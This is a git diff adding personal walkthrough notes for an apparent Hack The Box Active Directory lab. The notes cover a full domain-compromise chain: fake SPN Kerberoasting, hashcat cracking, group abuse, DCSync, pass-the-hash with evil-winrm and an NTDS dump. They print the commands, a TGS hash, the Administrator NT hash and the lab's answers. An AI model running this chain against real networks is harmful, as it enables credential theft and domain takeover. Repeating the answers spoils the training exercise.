@@ -214,16 +214,28 @@ mssqladm:DBAilfreight1!
 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 
 
-Question 1 - Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. 
-1. ssh -D 9050 -i rootkey -L 1337:172.16.8.20:3389 root@10.129.229.147 
-2. in second terminal tab -> ssh -D 9050 -i rootkey root@10.129.229.147
+Question 1 - Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. - Repeat09
+ 
+1. ssh -D 9050 -i rootkey -L 1337:172.16.8.20:3389 root@10.129.82.181
+2. in second terminal tab -> ssh -D 9050 -i rootkey root@10.129.82.181
 3. now because of the first command we ran we can RDP back to hporter and transfer PowerView which we downloaded before hand 
 4. xfreerdp /v:127.0.0.1:1337 /u:hporter /p:Gr8hambino! /drive:shared,/home/htb-ac-1235531/Desktop
 5. on hporter cli -> cd C:\share -> copy \\TSCLIENT\shared\PowerView.ps1
 6. on hporter cli -> powershell -> Import-Module .\PowerView.ps1 
-7. $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+7. 
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
-Set-DomainObject -credential \$Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+* Lesson Learned:
+* If PowerView starts throwing weird errors, remove and re-import it:
+PS SYNTAX: Remove-Module PowerView -ErrorAction Ignore
+PS SYNTAX: Import-Module .\PowerView.ps1 -Verbose
+
+* Session issues can cause errors—sometimes a fresh restart of PowerShell helps.
+
 
 
 What Are We Doing with These Commands?
@@ -257,20 +269,261 @@ Set-DomainObject is a PowerView function that modifies an Active Directory objec
 This adds a fake SPN (acmetesting/LEGIT) to ttimmons, making the system think ttimmons is running a service.
 
 
-8.  
+8.  on Sudo SU SHell on HOST -> 
+proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:.
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.3:389  ...  OK
+ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
+--------------------  --------  --------  --------------------------  ---------  ----------
+acmetesting/LEGIT     ttimmons            2022-06-01 13:32:18.194423  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.3:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.3:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.3:88  ...  OK
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$fce94ab8f6c1b0696e1b14b0f3326f30$94febe63e156381c849957ff95c71ca4d09b78d0be7e4085671804ce8c2841a169510dd9ffa9765461f1668e5374ed595e849876cfd3c9eaf135f05c874c0d0813f3a1bfa29a1b6b34d99cb824813dabb816d928a79b420580ae86d8e9db2d68e1b82b2da9774525b225669cf6574eec37fd44c8006f360e8cab0e9acc3dedbf27ac835c9bd8e828b5062453c464c2a4caa205192d0913e5147dfcb2dc229408c059d83e2298e73fc84d1166acef9307f4d60bd020fbf3780db67ce87215aff1e5105812c066658a07e33bb51c0899f7acdcfa014f9fb0b13189ad8dc40fc2b6573a5bf9adaa0584907f955f9f86283c36189b4a4fa1aa10e6ee2bed7e2c55c72e57c01cdf9ec56259573e6be2499b4a1fb637a2076366160a61a82c7947e90c858ea0becb4bb7d6164c8011e21f71de8a16649c48087d9a6d636a1824b0b94f809b8728d02aefc40ad6af5d4cd871053f2eaf1a38eef7e6c5250cf13e290946a85d44deda95c2c9481e8c9b686e4baae1b3481529701e7ff1f8e8b5394c6ce6ad1b1d019393264ab9810a56efd0d37b5b1ec7e4b77e57f1d2f346e9d2d6de1b53a0b52554049a7d0f62512dba576bde03f517a14da10a2a375b7b7211141066be7f84f68674a4f9d7b6ca95bf07ca18ccdcc547ffbb046413807da072fc3b617d56aad63185d170cc5523414d950d939eb43aa15dd96fc3fb214b92f49d4b50520fd56b3f752286a55d93e95ee8d04344eb6f0c657151b12114a062eed240d34a160cd9756ac35239c1fea91a4dee366e33213cb295eea48a2513dbecbb1c81e44df486e4c1f2b0cc74e51bb635688028b4fd80d864e88051cc669aa76eb01912a27e25fcacb128c26b21b89ae6398f51b40559ea9ea1b1381cfb62c2537e0827c1c595d11f9f98243b9571077dc3d7fb2f65218b23a86508d137fbda144cbee6059930ebf9549c895bb5acded560e40a1ba1423e51fa9c44adde312396f8111a9e6f46749edfa2dcdfbf87f46c5320497a095b54ef4495a9a0c34c808502e377f0846c8e86260aa85f9174d61afb6c20d378ae04be1818c426026ff6d09deeaae3b88315e9c324d18294f1f3eb58ff498eded7b5d7abff625d02c998834d2e6a1f4a01572a4aa1683b9c9ab2432ffef63b946eda5110159d44b95caa4ab11581069ed4d680a483fae215bee715749989b12368d7c7a4c488a67d972713d9b6be694df40b0b3e7f90fc519d2a541809e14fa16721145b5b0e649438b450263f44787ae1c07bf7814b52e1678b411c0c81240acbe6a9aa6a80e8ebe5da2b5c866c9cacb6b93f066d0b90f5e4427c1a5b918dd7868fcdac949dae136571399ebe418fe4fe
+
+10. now we copy and paste hash into ttimmonhash and then run this -> hashcat -m 13100 ttimmonhash /usr/share/wordlists/rockyou.txt --force
+11. we cracked hash -> Repeat09
 
 
 
 
 Question 2 - After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop.
+**!! this is in order to DCSync attack*!*!* 
+
+ back to PS session with Hporter CLI - >
+PS C:\Share> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+PS C:\Share> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+PS C:\Share> $group = Convert-NameToSid "Server Admins"
+PS C:\Share> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+3) once added to proper group -> on KALI run this on sudo su shell 
+4) proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+Output: 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
+
+
+Step-by-Step Breakdown
+Set ttimmons' Password in a Secure String
+
+
+$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+This stores ttimmons' password (Repeat09) in a secure format for authentication.
+
+Create a PSCredential Object
+
+
+$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+This creates a credential object using the username ttimmons and their password (Repeat09).
+
+This allows us to run commands as ttimmons without manually typing in credentials.
+
+Get the Server Admins Group SID
+
+
+$group = Convert-NameToSID "Server Admins"
+Converts "Server Admins" to its Security Identifier (SID).
+
+Why? Some commands require using the SID instead of the group name.
+
+Add ttimmons to the Server Admins Group
+
+
+Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -Verbose
+Adds ttimmons to the Server Admins group.
+
+Uses ttimmons' credentials ($timcreds) to execute the command.
+
+The -Verbose flag confirms that the user was successfully added.
+
+Why This Matters for the DCSync Attack
+Server Admins group has replication privileges (or at least high-level access).
+
+DCSync attacks abuse Active Directory replication to dump NTLM password hashes for all users.
+
+Once ttimmons is in Server Admins, you can run Mimikatz DCSync to extract hashes.
+
+
+
+5. ON SUDO SU SHELL ON HOST !!!!! -> proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.3:5985  ...  OK
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
+7c09eb1fff981654a3bb3b4a4e0d176a
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
 
 
 Question 3 - Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer.
+1. we have the answer above but heres how to do it inside of the Evil-WinRM shell 
+2. ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" quit quit
+3. cd \temp\ntds\
+4. cd "Active Directory" 
+5. download ntds.dit 
+6. repeat for registry directory 
+7. Extract hashes from the dumped files using secretsdump.py:
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+
+or impacket-secretsdump -just-dc INLANEFREIGHT.LOCAL/Administrator@172.16.8.3 -hashes :fd1f7e5564060258ea787ddbb6e6afa2 
 
 
 
 
+Lessons Learned from This Run
+This was a solid step-by-step approach through a full AD exploitation chain. Below are the major takeaways, optimizations for future blind runs, and enumeration steps to improve efficiency.
 
+Key Takeaways & Fixes for Next Blind Run
+BloodHound & SharpHound First
 
+Immediate Action: As soon as we gain a foothold, we need to immediately upload, execute, and extract BloodHound data before moving forward.
+
+Why? We wasted time manually checking privileges when BloodHound would have mapped out all possible attack paths instantly.
+
+Never Close Any Sessions
+
+Why? We lost access a few times due to closing shells. Keeping all entry points active prevents resetting progress.
+
+If we pivot into a user session (e.g., mssqladm, hporter, etc.), KEEP IT OPEN until we've completely finished with that account.
+
+PowerView Fixes
+
+When running PowerView, if errors occur:
+
+powershell
+Copy
+Edit
+Remove-Module PowerView -ErrorAction Ignore
+Import-Module .\PowerView.ps1 -Verbose
+Why? Fixes memory issues with repeated PowerView use.
+
+Enumerate ALL Credentials, Not Just What’s Asked
+
+The section had multiple credential pairs, but the questions only required one.
+
+Next time, extract, store, and test every set of creds rather than stopping once we solve a question.
+
+Full Attack Chain - Summary
+Initial Cred Hunting (mssqladm:DBAilfreight1!)
+
+Found by exploring the section (not through HTB's guided questions).
+
+BloodHound Revealed GenericWrite on ttimmons
+
+Allowed us to modify ttimmons’s attributes (abused for Kerberoasting).
+
+Set a Fake SPN on ttimmons
+
+Command:
+
+powershell
+Copy
+Edit
+Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'}
+This made ttimmons a Kerberoasting target.
+
+Extract & Crack Kerberos Hash
+
+Command:
+
+bash
+Copy
+Edit
+proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+Extracted TGS hash, then cracked it:
+
+bash
+Copy
+Edit
+hashcat -m 13100 ttimmons_hash /usr/share/wordlists/rockyou.txt --force
+Password Cracked: Repeat09
+
+Privilege Escalation via BloodHound
+
+New Info: ttimmons had GenericAll over Server Admins, which has DCSync privileges.
+
+Added ttimmons to Server Admins
+
+Commands:
+
+powershell
+Copy
+Edit
+$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+$group = Convert-NameToSid "Server Admins"
+Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -Verbose
+Executed DCSync Attack
+
+Command:
+
+bash
+Copy
+Edit
+proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+Extracted NTLM Hashes for Domain Admins.
+
+Full Domain Compromise & NTDS Dump
+
+Used the Administrator NTLM hash to log in:
+
+bash
+Copy
+Edit
+proxychains evil-winrm -i 172.16.8.3 -u Administrator -H <NTLM_HASH>
+Dumped NTDS.dit for full domain control:
+
+bash
+Copy
+Edit
+ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" quit quit
+What to Look for Next Time
+✅ Use SharpHound ASAP
+
+First thing after initial compromise.
+
+✅ Dump ALL possible credentials
+
+Instead of just solving questions, dump every possible set of creds.
+
+✅ Keep ALL footholds open
+
+Maintain RDP, PowerShell, and WinRM shells to avoid resets.
+
+✅ Optimize AD Enumeration
+
+Look at full AD enumeration, not just what’s needed for the question.
+
+Use Get-DomainUser, Get-DomainGroupMember, Get-DomainComputer.
+
+✅ Test all attack paths from BloodHound
+
+Even if one path works, explore all to optimize real-world assessments.
+
+Next Blind Run Focus
+No Guided Prompts: Work purely off BloodHound and manual enumeration.
+
+Alternative Methods: Test other privilege escalation routes (e.g., Kerberos Delegation, LAPS, Unconstrained Delegation).
+
+Faster Execution: Try to cut execution time in half by improving automation.
+
+Next time, let’s see how much faster and cleaner we can execute. 🚀
 
 
